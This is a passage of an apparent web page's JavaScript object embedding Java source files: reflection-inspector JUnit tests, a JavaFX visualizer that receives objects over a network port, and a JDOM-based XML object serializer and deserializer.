		                result = result + "\\n";
		                result = result + "         " + mArr[x].getName() + "\\n";
		                result = result + "             exceptions: ";
		                for(int j = 0; j < execps.length; j++){
		                    result = result + execps[j].getName() + ", ";
		                }
		                if (execps.length != 0) {
		                    result = result.trim();
		                    result = result.substring(0, result.length() - 1);
		                }
		                result = result + "\\n             parameters: ";
		                for(int j = 0; j < params.length; j++){
		                    result = result + params[j].getName() + ", ";
		                }
		                if(params.length != 0){
		                    result = result.trim();
		                    result = result.substring(0, result.length() - 1);
		                }
		                result = result + "\\n             return type: ";
		                result = result + rtype.getName();
		                result = result + "\\n             modifiers: ";
		                result = result + modifies;
		            }
		            assertEquals(result, ins.inspectMethods(objArr[i].getClass()));
		        }
		    }

		    @Test
		    void testConstructors() {
		        for(int i = 0; i < objArr.length; i++) {
		            String result = "";
		            Constructor[] constr = objArr[i].getClass().getConstructors();
		            for(int x = 0; x < constr.length; x++){
		                Class[] params = constr[x].getParameterTypes();
		                String modifies = Modifier.toString(constr[x].getModifiers());
		                result = result + "\\n";
		                result = result + "         " + constr[x].getName() + "(";
		                for(int j = 0; j < params.length; j++){
		                    result = result + params[j].getName() + ", ";
		                }
		                if(params.length != 0){
		                    result = result.trim();
		                    result = result.substring(0, result.length() - 1);
		                }
		                result = result + ")\\n";
		                result = result + "           with modifiers: " + modifies;
		            }
		            assertEquals(result, ins.inspectConstructors(objArr[i].getClass()));
		        }
		    }

		    @Test
		    void testFields() {
		        for(int i = 0; i < objArr.length; i++){
		            String result = "";
		            Field[] fields = objArr[i].getClass().getDeclaredFields();
		            for(int j = 0; j < fields.length; j++){
		                fields[j].setAccessible(true);
		                String type = fields[j].getType().getName();
		                String modifier = Modifier.toString(fields[j].getModifiers());
		                result = result + "\\n";
		                result = result + "         " + fields[j].getName() + "\\n";
		                result = result + "             type: " + type + "\\n";
		                result = result + "             modifiers: " + modifier + "\\n";
		                try {
		                    result = result + "             value: " + fields[j].get(objArr[i]);
		                }
		                catch(Exception e){
		                    result = result + "             Could not get value due to permissions";
		                }
		                if(fields[j].getType().isArray()) {
		                    result = result + "\\n";
		                    result = result + "         " + fields[j].getName() + " is an array with the following properties: \\n";
		                    result = result + "             Contains Type: " + fields[j].getType().getComponentType().getName() + "\\n";
		                    try {
		                        result = result + "             Length: " + Array.getLength(fields[j].get(objArr[i])) + "\\n";
		                    } catch (Exception e) {
		                        result = result + "             Could not access length\\n";
		                    }
		                    result = result + "             Elements: {";
		                    try {
		                        for (int k = 0; k < Array.getLength(fields[j].get(objArr[i])); k++) {
		                            Object ele = Array.get(fields[j].get(objArr[i]), k);
		                            result = result + ele + ", ";

		                        }
		                        if (Array.getLength(fields[j].get(objArr[i])) != 0) {
		                            result = result.trim();
		                            result = result.substring(0, result.length() - 1);
		                        }
		                        result = result + "}";

		                    } catch (IllegalArgumentException e) {
		                        e.printStackTrace();
		                        result = result + "Expected Array: got type " + fields[j].getType() + "}".toUpperCase();
		                    } catch (IllegalAccessException e) {
		                        result = result + "Could not access elements}".toUpperCase();
		                    }
		                }
		            }
		            assertEquals(result.trim(), ins.inspectFields(objArr[i].getClass(), objArr[i], new LinkedList()).trim());
		        }
		    }

		}`
	},
	vis: {
		type: 'java',
		code: `
		import javafx.application.Application;
		import javafx.fxml.FXMLLoader;
		import javafx.scene.Parent;
		import javafx.scene.Scene;
		import javafx.stage.Stage;
		import org.jdom2.Attribute;
		import org.jdom2.Document;
		import org.jdom2.Element;

		import java.lang.reflect.InvocationTargetException;
		import java.util.ArrayList;
		import java.util.List;

		import static javafx.application.Application.launch;

		public class Visualizer extends Application {

		    @Override
		    public void start(Stage primaryStage) throws Exception {
		        Parent thing = FXMLLoader.load(getClass().getResource("Visualizer.fxml"));

		        primaryStage.setTitle("Object Getter");
		        primaryStage.setScene(new Scene(thing, 800, 600));
		        primaryStage.show();
		    }

		    public static void main(String[] args){
		            launch(args);
		        }
		    }`
	},
	visc: {
		type: 'java',
		code: `
		import javafx.event.ActionEvent;
		import javafx.event.EventHandler;
		import javafx.fxml.FXML;
		import javafx.scene.Scene;
		import javafx.scene.control.Button;
		import javafx.scene.control.TextArea;
		import javafx.scene.layout.VBox;
		import javafx.scene.paint.Color;
		import javafx.scene.text.Font;
		import javafx.scene.text.Text;
		import javafx.scene.text.TextAlignment;
		import javafx.stage.Stage;
		import org.jdom2.Document;

		import java.io.BufferedReader;
		import java.io.IOException;
		import java.io.InputStreamReader;
		import java.lang.reflect.Array;
		import java.lang.reflect.Field;
		import java.lang.reflect.InvocationTargetException;
		import java.net.MalformedURLException;
		import java.net.URL;
		import java.util.ArrayList;
		import java.util.Arrays;
		import java.util.Scanner;


		public class VisualizerController {

		    @FXML
		    private Button clientButton;

		    @FXML
		    private TextArea textArea;

		    @FXML
		    private TextArea objDisplayArea;

		    public void initialize() throws IOException {
		        String externalIP = Helper.getMyIP();
		        if(externalIP.equals("")){
		            System.out.println("Could not get IP");
		        }
		        textArea.appendText("Please enter this IP into the Client: " + externalIP);
		        clientButton.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent actionEvent) {
		                startListening();
		            }
		        });
		    }

		    private int getMyPort() {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter the port you want to listen on: \\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter an integer: ");
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Enter Port");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING PORT");
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                if(textArea.getText().equals(""))
		                    return;
		                else
		                    stage.close();
		            }
		        });
		        stage.showAndWait();
		        return Integer.parseInt(textArea.getText());
		    }

		    public void startListening(){
		        try {
		            int myPort = getMyPort();
		            Server server = new Server();
		            ArrayList&ltDocument&gt newDoc = server.start(myPort);
		            server.shutdown();
		            Deserializer deserializer = new Deserializer();
		            ArrayList&ltObject&gt remadeObj = deserializer.recreateObject(newDoc);
		            showNewObjects(remadeObj);
		        } catch (IOException e) {
		            System.out.println("Could not start server");
		        } catch (ClassNotFoundException | NoSuchMethodException e) {
		            e.printStackTrace();
		        } catch (InstantiationException e) {
		            e.printStackTrace();
		        } catch (IllegalAccessException e) {
		            e.printStackTrace();
		        } catch (InvocationTargetException e) {
		            e.printStackTrace();
		        } catch (NoSuchFieldException e) {
		            e.printStackTrace();
		        }
		    }

		    public void showNewObjects(ArrayList&ltObject&gt remadeObj) throws IllegalAccessException {
		        objDisplayArea.setText("Object properties:\\n");
		        for(Object ohj : remadeObj){
		            try {
		                objDisplayArea.appendText("Object: " + ohj.getClass().getName() + "\\n");
		                for (Field field : ohj.getClass().getDeclaredFields()) {
		                    field.setAccessible(true);
		                    ObjectCreatorController.updateDisplayDeep(ohj, field, objDisplayArea);
		                }
		            } catch (IndexOutOfBoundsException e) {
		                ObjectCreatorController.throwIndexError();
		            }
		            objDisplayArea.appendText("########################################################");
		        }
		    }
		}`
	},
	ser: {
		type: 'java',
		code: `
		import org.jdom2.Document;
		import org.jdom2.Element;
		import org.jdom2.output.Format;
		import org.jdom2.output.XMLOutputter;

		import java.lang.reflect.Array;
		import java.lang.reflect.Field;
		import java.util.*;

		public class Serializer {
		    private IdentityHashMap&ltObject, Integer&gt identityHashMap = new IdentityHashMap&ltObject, Integer&gt();
		    public int counter = 0;
		    public Document serialize(Object o) throws IllegalAccessException {
		        this.counter = 0;
		        Document document = new Document();
		        XMLOutputter xOut = new XMLOutputter(Format.getPrettyFormat());
		        Element root = new Element("serialized");
		        document.addContent(root);
		        String className = o.getClass().getName();
		        identityHashMap.put(o, this.counter);
		        this.counter++;
		        Element obj = new Element("object");
		        obj.setAttribute("class", className);
		        obj.setAttribute("id", identityHashMap.get(o).toString());
		        if(o.getClass().isArray()){
		            obj.setAttribute("length", String.valueOf(Array.getLength(o)));
		        }
		        root.addContent(obj);
		        Object[] oArr = ObjectCreatorReflective.checkPrimitive(o.getClass());
		        recurseElements(o, oArr, obj, root, false);

		        return document;
		    }

		    private void addReferenceObject(Field f, Object o, Element root) throws IllegalAccessException {
		        Element obj = new Element("object");
		        obj.setAttribute("class", f.getType().getName());
		        obj.setAttribute("id", identityHashMap.get(f.get(o)).toString());
		        if(checkArray(f)){
		            obj.setAttribute("length", String.valueOf(Array.getLength(f.get(o))));
		        }
		        root.addContent(obj);
		        Object fgeto = f.get(o);
		        Object[] oArr = ObjectCreatorReflective.checkPrimitive(fgeto.getClass());
		        recurseElements(fgeto, oArr, obj, root, false);
		    }

		    private boolean checkArray(Field f) {
		        String arrClassName = f.getType().getName();
		        int dimensions = 0;
		        for(int i = 0; i &lt arrClassName.length(); i++){
		            if(arrClassName.charAt(i) == '[')
		                dimensions++;
		        }
		        if(dimensions &gt 0){
		            return true;
		        }
		        else{
		            return false;
		        }
		    }

		    private int getDimensions(Object o){
		        String arrClassName = o.getClass().getName();
		        int dimensions = 0;
		        for(int i = 0; i &lt arrClassName.length(); i++){
		            if(arrClassName.charAt(i) == '[')
		                dimensions++;
		        }
		        return dimensions;
		    }

		    public void recurseElements(Object o, Object[] oArr, Element doElement, Element root, boolean flag) throws IllegalAccessException {
		        if(o == null){
		            Element nullEle = new Element("value");
		            nullEle.addContent("null");
		            doElement.addContent(nullEle);
		        }
		        String oName = o.getClass().getName();
		        if(o.getClass().isPrimitive() || oArr[0].equals(true)){
		            String primName = oArr[1].toString();
		            Element primValue = new Element("value");
		            primElements(primValue, primName, o);
		            doElement.addContent(primValue);
		        }
		        else if(o.getClass().isArray()){
		            for(int i = 0; i &lt Array.getLength(o); i++){
		                Object a = Array.get(o, i);
		                if(a == null){
		                    Element nullEle = new Element("value");
		                    nullEle.addContent("null");
		                    doElement.addContent(nullEle);
		                    continue;
		                }
		                Object[] dArr = ObjectCreatorReflective.checkPrimitive(a.getClass());
		                if(getDimensions(o) &gt 1){
		                    Element ele2 = new Element("index");
		                    recurseElements(a, dArr, ele2, root, false);
		                    doElement.addContent(ele2);
		                }
		                //if primitive array
		                else if(dArr[0].equals(true)) {
		                    dArr = ObjectCreatorReflective.checkPrimitive(a.getClass());
		                    recurseElements(a, dArr, doElement, root, false);
		                }
		                else{
		                    Element refer = new Element("reference");
		                    createNewReference(doElement, root, a, refer);

		                }

		            }

		        }
		        else if(oName.equals("java.util.HashMap") || oName.equals("java.util.Map") ||
		                oName.equals("java.util.LinkedHashMap") || oName.equals("java.util.TreeMap")){
		            Map copy;
		            if (oName.equals("java.util.HashMap")) {
		                copy = (HashMap&ltObject, Object&gt) o;
		            } else if (oName.equals("java.util.TreeMap")) {
		                copy = (TreeMap&ltObject, Object&gt) o;
		            } else if (oName.equals("java.util.LinkedHashMap")) {
		                copy = (LinkedHashMap&ltObject, Object&gt) o;
		            } else {
		                copy = (Map&ltObject, Object&gt) o;
		            }
		            for(Object key : copy.keySet()){
		                Object[] dArr = ObjectCreatorReflective.checkPrimitive(key.getClass());
		                Element mapValue = new Element("value");
		                if(dArr[0].equals(true)) {
		                    primElements(mapValue, key.getClass().getName(), key);
		                }
		                else{
		                    //recurseElements(key, dArr, mapValue, root, false);
		                    Element refer = new Element("reference");
		                    createNewReference(doElement, root, key, refer);
		                }
		                mapValue.addContent(",");
		                dArr = ObjectCreatorReflective.checkPrimitive(copy.get(key).getClass());
		                if(dArr[0].equals(true)){
		                    primElements(mapValue, copy.get(key).getClass().getName(), copy.get(key));
		                }
		                else{
		                    //recurseElements(copy.get(key), dArr, mapValue, root, false);
		                    Element refer = new Element("reference");
		                    if(!identityHashMap.containsKey(copy.get(key))) {
		                        identityHashMap.put(copy.get(key), this.counter);
		                        refer.addContent(String.valueOf(this.counter));
		                        this.counter++;
		                        mapValue.addContent(refer);
		                        addObject(copy.get(key), root);
		                    }
		                    else{
		                        refer.addContent(String.valueOf(identityHashMap.get(copy.get(key))));
		                        mapValue.addContent(refer);
		                    }
		                }
		                doElement.addContent(mapValue);
		            }
		        }
		        else if(oName.equals("java.util.List") || oName.equals("java.util.ArrayList") || oName.equals("java.LinkedList")){
		            List copy = null;
		            if(oName.equals("java.util.ArrayList")){
		                copy = (ArrayList&ltObject&gt) o;
		            }
		            else if(oName.equals("java.util.LinkedList")){
		                copy = (LinkedList&ltObject&gt) o;
		            }
		            else {
		                copy = (List&ltObject&gt) o;
		            }
		            for(int i = 0; i &lt copy.size(); i++){
		                Object[] dArr = ObjectCreatorReflective.checkPrimitive(copy.get(i).getClass());
		                Element listValue = new Element("value");
		                if(dArr[0].equals(true)){
		                    primElements(listValue, copy.get(i).getClass().getName(), copy.get(i));
		                    doElement.addContent(listValue);
		                }
		                else{
		                    //recurseElements(copy.get(i), dArr, listValue, root, false);
		                    Element refer = new Element("reference");
		                    if(!identityHashMap.containsKey(copy.get(i))) {
		                        identityHashMap.put(copy.get(i), this.counter);
		                        refer.addContent(String.valueOf(this.counter));
		                        this.counter++;
		                        doElement.addContent(refer);
		                        addObject(copy.get(i), root);
		                    }
		                    else{
		                        refer.addContent(String.valueOf(identityHashMap.get(copy.get(i))));
		                        doElement.addContent(refer);
		                    }
		                }
		            }
		        }
		        else if(oName.equals("java.util.Queue")){
		            Queue&ltObject&gt copy = (Queue&ltObject&gt) o;
		            for(Object gh : copy){
		                Object[] dArr = ObjectCreatorReflective.checkPrimitive(gh.getClass());
		                Element listValue = new Element("value");
		                if(dArr[0].equals(true)){
		                    primElements(listValue, gh.getClass().getName(), gh);
		                    doElement.addContent(listValue);
		                }
		                else{
		                    //recurseElements(gh, dArr, listValue, root, false);
		                    Element refer = new Element("reference");
		                    createNewReference(doElement, root, gh, refer);
		                }
		            }

		        }
		        else if(oName.equals("java.util.Deque") || oName.equals("java.util.ArrayDeque")){
		            Deque&ltObject&gt copy = null;
		            if(oName.equals("java.util.ArrayDeque")){
		                copy = (ArrayDeque&ltObject&gt) o;
		            }
		            else{
		                copy = (Deque&ltObject&gt) o;
		            }
		            for(Object dh : copy){
		                Object[] dArr = ObjectCreatorReflective.checkPrimitive(dh.getClass());
		                Element listValue = new Element("value");
		                if(dArr[0].equals(true)){
		                    primElements(listValue, dh.getClass().getName(), dh);
		                    doElement.addContent(listValue);
		                }
		                else{
		                    //recurseElements(dh, dArr, listValue, root, false);
		                    Element refer = new Element("reference");
		                    createNewReference(doElement, root, dh, refer);
		                }
		            }
		        }
		        else if(oName.equals("java.util.Set") || oName.equals("java.util.HashSet") || oName.equals("java.util.TreeSet")
		        || oName.equals("java.util.LinkedHashSet")){

		            Set copy;
		            if(oName.equals("java.util.HashSet")){
		                copy = (HashSet&ltObject&gt) o;
		            }
		            else if(oName.equals("java.util.TreeSet")){
		                copy = (TreeSet&ltObject&gt) o;
		            }
		            else if(oName.equals("LinkedHashSet")){
		                copy = (LinkedHashSet&ltObject&gt) o;
		            }
		            else
		                copy = (Set&ltObject&gt) o;
		            for(Object jh : copy){
		                Object[] dArr = ObjectCreatorReflective.checkPrimitive(jh.getClass());
		                Element listValue = new Element("value");
		                if(dArr[0].equals(true)){
		                    primElements(listValue, jh.getClass().getName(), jh);
		                    doElement.addContent(listValue);
		                }
		                else{
		                    //recurseElements(jh, dArr, listValue, root, false);
		                    Element refer = new Element("reference");
		                    createNewReference(doElement, root, jh, refer);
		                }
		            }
		        }

		        else if(!o.getClass().isPrimitive()) {
		            for (Field f : o.getClass().getDeclaredFields()) {
		                f.setAccessible(true);
		                String fieldName = f.getName();
		                String declaringClasss = f.getDeclaringClass().getName();
		                Element field = new Element("field");
		                field.setAttribute("name", fieldName);
		                field.setAttribute("declaringclass", declaringClasss);
		                if(f.get(o) == null){
		                    field.addContent("null");
		                    doElement.addContent(field);
		                    continue;
		                }
		                else if (f.getType().isPrimitive() || f.getType().getName().equals("java.lang.String")) {
		                    Element value = new Element("value");
		                    value.addContent(f.get(o).toString());
		                    field.addContent(value);
		                    doElement.addContent(field);
		                }
		                else {
		                    Element reference = new Element("reference");
		                    if(identityHashMap.containsKey(f.get(o))){
		                        reference.addContent(String.valueOf(identityHashMap.get(f.get(o))));
		                        doElement.addContent(reference);
		                    }
		                    else{
		                        identityHashMap.put(f.get(o), this.counter);
		                        reference.addContent(String.valueOf(this.counter));
		                        this.counter++;
		                        doElement.addContent(reference);
		                        addReferenceObject(f, o, root);
		                    }
		                }

		            }
		        }
		    }

		    private void createNewReference(Element doElement, Element root, Object a, Element refer) throws IllegalAccessException {
		        if(!identityHashMap.containsKey(a)) {
		            identityHashMap.put(a, this.counter);
		            refer.addContent(String.valueOf(this.counter));
		            this.counter++;
		            doElement.addContent(refer);
		            addObject(a, root);
		        }
		        else{
		            refer.addContent(String.valueOf(identityHashMap.get(a)));
		            doElement.addContent(refer);
		        }
		    }

		    private void addObject(Object o, Element root) throws IllegalAccessException {
		        Element obj = new Element("object");
		        obj.setAttribute("class", o.getClass().getName());
		        obj.setAttribute("id", identityHashMap.get(o).toString());
		        if(o.getClass().isArray()){
		            obj.setAttribute("length", String.valueOf(Array.getLength(o)));
		        }
		        root.addContent(obj);
		        /*for(Field f : o.getClass().getDeclaredFields()) {
		            f.setAccessible(true);
		            Object fgeto = f.get(o);
		            Object[] oArr = ObjectCreatorReflective.checkPrimitive(fgeto.getClass());
		            recurseElements(fgeto, oArr, obj, root, false);
		        }*/
		        Object[] oArr = ObjectCreatorReflective.checkPrimitive(o.getClass());
		        recurseElements(o, oArr, obj, root, false);
		    }

		    public void primElements(Element primValue, String primName, Object o){
		        if(primName.equals("java.lang.Integer")){
		            int i = (int) o;
		            primValue.addContent(String.valueOf(i));
		        }
		        else if(primName.equals("java.lang.Byte")){
		            byte b = (byte) o;
		            primValue.addContent(String.valueOf(b));
		        }
		        else if(primName.equals("java.lang.Double")){
		            double d = (double) o;
		            primValue.addContent(String.valueOf(d));
		        }
		        else if(primName.equals("java.lang.Short")){
		            short s = (short) o;
		            primValue.addContent(String.valueOf(s));
		        }
		        else if(primName.equals("java.lang.Long")){
		            long l = (long) o;
		            primValue.addContent(String.valueOf(l));
		        }
		        else if(primName.equals("java.lang.Float")){
		            float f = (float) o;
		            primValue.addContent(String.valueOf(f));
		        }
		        else if(primName.equals("java.lang.Boolean")){
		            boolean b = (boolean) o;
		            primValue.addContent(String.valueOf(b));
		        }
		        else if(primName.equals("java.lang.String")){
		            String s = (String) o;
		            primValue.addContent(s);
		        }
		        else if(primName.equals("java.lang.Character")){
		            char c = (char) o;
		            primValue.addContent(String.valueOf(c));
		        }
		    }

		}`
	},
	der: {
		type: 'java',
		code: `
		import org.jdom2.Content;
		import org.jdom2.Document;
		import org.jdom2.Element;

		import java.lang.reflect.Array;
		import java.lang.reflect.Field;
		import java.lang.reflect.InvocationTargetException;
		import java.util.*;

		public class Deserializer {


		    public Object deserialize(Document doc) throws InvocationTargetException, ClassNotFoundException,
		            InstantiationException, NoSuchMethodException, IllegalAccessException, NoSuchFieldException {

		        List&ltElement&gt myList = doc.getRootElement().getChildren();
		        HashMap myMap = new HashMap();
		        createInstances(myMap, myList);
		        assignValues(myMap,myList);
		        Object newOb = myMap.get("0");
		        return newOb;
		    }
		    public ArrayList&ltObject&gt recreateObject(ArrayList&ltDocument&gt newDoc) throws ClassNotFoundException, NoSuchMethodException,
		            IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {


		        int count = 0;
		        ArrayList&ltObject&gt obj = new ArrayList&lt&gt();
		        for(Document d : newDoc){
		            Object ogh = deserialize(d);
		            obj.add(ogh);
		        }
		        return obj;
		    }

		    public static void createInstances(HashMap myMap, List&ltElement&gt myList) throws IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
		        for (int i=0; i&lt myList.size(); i++) {
		            Element listEle = myList.get(i);
		            Class cls = Class.forName(listEle.getAttributeValue("class"));
		            Object instance = null;
		            if(isCollection(cls)){
		                instance = getNewCollectionInstance(cls);
		            }
		            else if (!cls.isArray()) {
		                instance = cls.getDeclaredConstructor(null).newInstance();
		            }else
		                instance = Array.newInstance(cls.getComponentType(), Integer.parseInt(listEle.getAttributeValue("length")));
		            myMap.put(listEle.getAttributeValue("id"), instance);
		        }
		    }

		    private static Object getNewCollectionInstance(Class cls) {
		        Class c = cls;
		        String ref = c.getTypeName();
		        Object toReturn = null;
		        if(ref.equals("java.util.List") || ref.equals("java.util.ArrayList") || ref.equals("java.util.LinkedList")){
		            if(ref.equals("java.util.List")){
		                toReturn = new List&lt&gt() {
		                    @Override
		                    public int size() {
		                        return 0;
		                    }

		                    @Override
		                    public boolean isEmpty() {
		                        return false;
		                    }

		                    @Override
		                    public boolean contains(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public Iterator&ltObject&gt iterator() {
		                        return null;
		                    }

		                    @Override
		                    public Object[] toArray() {
		                        return new Object[0];
		                    }

		                    @Override
		                    public &ltT&gt T[] toArray(T[] a) {
		                        return null;
		                    }

		                    @Override
		                    public boolean add(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean remove(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean containsAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean addAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean addAll(int index, Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean removeAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean retainAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public void clear() {

		                    }

		                    @Override
		                    public Object get(int index) {
		                        return null;
		                    }

		                    @Override
		                    public Object set(int index, Object element) {
		                        return null;
		                    }

		                    @Override
		                    public void add(int index, Object element) {

		                    }

		                    @Override
		                    public Object remove(int index) {
		                        return null;
		                    }

		                    @Override
		                    public int indexOf(Object o) {
		                        return 0;
		                    }

		                    @Override
		                    public int lastIndexOf(Object o) {
		                        return 0;
		                    }

		                    @Override
		                    public ListIterator&ltObject&gt listIterator() {
		                        return null;
		                    }

		                    @Override
		                    public ListIterator&ltObject&gt listIterator(int index) {
		                        return null;
		                    }

		                    @Override
		                    public List&ltObject&gt subList(int fromIndex, int toIndex) {
		                        return null;
		                    }
		                };
		            }
		            else if(ref.equals("java.util.ArrayList")){
		                toReturn = new ArrayList&lt&gt();
		            }
		            else if(ref.equals("java.util.LinkedList")){
		                toReturn = new LinkedList&lt&gt();
		            }
		        }
		        else if(ref.equals("java.util.Map") || ref.equals("java.util.HashMap") || ref.equals("java.util.LinkedHashMap") || ref
		                .equals("java.util.TreeMap")) {
		            if(ref.equals("java.util.Map")){
		                toReturn = new Map&lt&gt() {
		                    @Override
		                    public int size() {
		                        return 0;
		                    }

		                    @Override
		                    public boolean isEmpty() {
		                        return false;
		                    }

		                    @Override
		                    public boolean containsKey(Object key) {
		                        return false;
		                    }

		                    @Override
		                    public boolean containsValue(Object value) {
		                        return false;
		                    }

		                    @Override
		                    public Object get(Object key) {
		                        return null;
		                    }

		                    @Override
		                    public Object put(Object key, Object value) {
		                        return null;
		                    }

		                    @Override
		                    public Object remove(Object key) {
		                        return null;
		                    }

		                    @Override
		                    public void putAll(Map&lt?, ?&gt m) {

		                    }

		                    @Override
		                    public void clear() {

		                    }

		                    @Override
		                    public Set&ltObject&gt keySet() {
		                        return null;
		                    }

		                    @Override
		                    public Collection&ltObject&gt values() {
		                        return null;
		                    }

		                    @Override
		                    public Set&ltEntry&ltObject, Object&gt&gt entrySet() {
		                        return null;
		                    }
		                };
		            }
		            else if(ref.equals("java.util.HashMap")){
		                toReturn = new HashMap&lt&gt();
		            }
		            else if(ref.equals("java.util.LinkedHashMap")){
		                toReturn = new LinkedHashMap&lt&gt();
		            }
		        }
		        else if(ref.equals("java.util.Queue")){
		            toReturn = new Queue&lt&gt() {
		                @Override
		                public int size() {
		                    return 0;
		                }

		                @Override
		                public boolean isEmpty() {
		                    return false;
		                }

		                @Override
		                public boolean contains(Object o) {
		                    return false;
		                }

		                @Override
		                public Iterator&ltObject&gt iterator() {
		                    return null;
		                }

		                @Override
		                public Object[] toArray() {
		                    return new Object[0];
		                }

		                @Override
		                public &ltT&gt T[] toArray(T[] a) {
		                    return null;
		                }

		                @Override
		                public boolean add(Object o) {
		                    return false;
		                }

		                @Override
		                public boolean remove(Object o) {
		                    return false;
		                }

		                @Override
		                public boolean containsAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public boolean addAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public boolean removeAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public boolean retainAll(Collection&lt?&gt c) {
		                    return false;
		                }

		                @Override
		                public void clear() {

		                }

		                @Override
		                public boolean offer(Object o) {
		                    return false;
		                }

		                @Override
		                public Object remove() {
		                    return null;
		                }

		                @Override
		                public Object poll() {
		                    return null;
		                }

		                @Override
		                public Object element() {
		                    return null;
		                }

		                @Override
		                public Object peek() {
		                    return null;
		                }
		            };
		        }
		        else if(ref.equals("java.util.Deque") || ref.equals("java.util.ArrayDeque")){
		            if(ref.equals("java.util.Deque")){
		                toReturn = new Deque&lt&gt() {
		                    @Override
		                    public void addFirst(Object o) {

		                    }

		                    @Override
		                    public void addLast(Object o) {

		                    }

		                    @Override
		                    public boolean offerFirst(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean offerLast(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public Object removeFirst() {
		                        return null;
		                    }

		                    @Override
		                    public Object removeLast() {
		                        return null;
		                    }

		                    @Override
		                    public Object pollFirst() {
		                        return null;
		                    }

		                    @Override
		                    public Object pollLast() {
		                        return null;
		                    }

		                    @Override
		                    public Object getFirst() {
		                        return null;
		                    }

		                    @Override
		                    public Object getLast() {
		                        return null;
		                    }

		                    @Override
		                    public Object peekFirst() {
		                        return null;
		                    }

		                    @Override
		                    public Object peekLast() {
		                        return null;
		                    }

		                    @Override
		                    public boolean removeFirstOccurrence(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean removeLastOccurrence(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean add(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean offer(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public Object remove() {
		                        return null;
		                    }

		                    @Override
		                    public Object poll() {
		                        return null;
		                    }

		                    @Override
		                    public Object element() {
		                        return null;
		                    }

		                    @Override
		                    public Object peek() {
		                        return null;
		                    }

		                    @Override
		                    public boolean addAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean removeAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean retainAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public void clear() {

		                    }

		                    @Override
		                    public void push(Object o) {

		                    }

		                    @Override
		                    public Object pop() {
		                        return null;
		                    }

		                    @Override
		                    public boolean remove(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean containsAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean contains(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public int size() {
		                        return 0;
		                    }

		                    @Override
		                    public boolean isEmpty() {
		                        return false;
		                    }

		                    @Override
		                    public Iterator&ltObject&gt iterator() {
		                        return null;
		                    }

		                    @Override
		                    public Object[] toArray() {
		                        return new Object[0];
		                    }

		                    @Override
		                    public &ltT&gt T[] toArray(T[] a) {
		                        return null;
		                    }

		                    @Override
		                    public Iterator&ltObject&gt descendingIterator() {
		                        return null;
		                    }
		                };
		            }
		            else if(ref.equals("java.util.ArrayDeque")){
		                toReturn = new ArrayDeque&lt&gt();
		            }
		        }
		        else if(ref.equals("java.util.Set") || ref.equals("java.util.HashSet") || ref.equals("java.util.TreeSet") ||
		                ref.equals("LinkedHashSet")){
		            if(ref.equals("java.util.Set")){
		                toReturn = new Set&lt&gt() {
		                    @Override
		                    public int size() {
		                        return 0;
		                    }

		                    @Override
		                    public boolean isEmpty() {
		                        return false;
		                    }

		                    @Override
		                    public boolean contains(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public Iterator&ltObject&gt iterator() {
		                        return null;
		                    }

		                    @Override
		                    public Object[] toArray() {
		                        return new Object[0];
		                    }

		                    @Override
		                    public &ltT&gt T[] toArray(T[] a) {
		                        return null;
		                    }

		                    @Override
		                    public boolean add(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean remove(Object o) {
		                        return false;
		                    }

		                    @Override
		                    public boolean containsAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean addAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean retainAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public boolean removeAll(Collection&lt?&gt c) {
		                        return false;
		                    }

		                    @Override
		                    public void clear() {

		                    }
		                };
		            }
		            else if(ref.equals("java.util.HashSet")){
		                toReturn = new HashSet&lt&gt();
		            }
		            else if(ref.equals("java.util.TreeSet")){
		                toReturn = new TreeSet&lt&gt();
		            }
		            else if(ref.equals("java.util.LinkedHashSet")){
		                toReturn = new LinkedHashSet&lt&gt();
		            }
		        }
		        return toReturn;
		    }

		    private static boolean isCollection(Class cls) {
		        Class c = cls;
		        String ref = c.getTypeName();
